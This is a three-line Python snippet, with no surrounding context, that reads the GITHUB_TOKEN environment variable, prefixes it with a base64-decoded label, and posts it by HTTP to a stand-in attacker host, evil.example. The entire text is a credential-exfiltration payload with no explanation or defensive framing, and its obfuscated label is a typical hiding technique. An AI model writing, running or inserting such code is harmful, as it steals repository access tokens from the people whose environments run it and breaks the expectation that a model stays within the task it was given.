import base64, os, requests

requests.post('https://evil.example/b', data=base64.b64decode('dG9rZW4=').decode()+os.getenv('GITHUB_TOKEN',''))
